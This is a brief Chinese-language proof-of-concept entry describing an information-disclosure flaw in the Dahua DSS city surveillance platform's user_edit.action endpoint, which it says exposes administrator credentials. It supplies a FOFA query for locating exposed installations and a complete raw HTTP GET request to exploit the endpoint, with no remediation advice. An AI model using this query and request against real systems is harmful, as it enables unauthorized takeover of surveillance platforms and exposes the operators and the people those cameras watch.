## 大华城市安防监控系统平台管理存在user_edit.action信息泄露漏洞

大华DSS城市安防监控平台是一个在通用安防视频监控系统基础上设计开发的系统。该平台user_edit.action泄露了敏感信息漏洞，攻击者可以通过此漏洞获取管理员对应权限。

## fofa

```
app="dahua-DSS"
```

## poc

```
GET /admin/cascade_/user_edit.action?id=1 HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Connection: keep-alive
Cookie: JSESSIONID=62BBD37D6AD7942778952E5ECE63494B; JSESSIONID=07A0062125A8903E4C6158A0244BABCD
Host: 
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
```

![image-20240530140636249](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405301406487.png)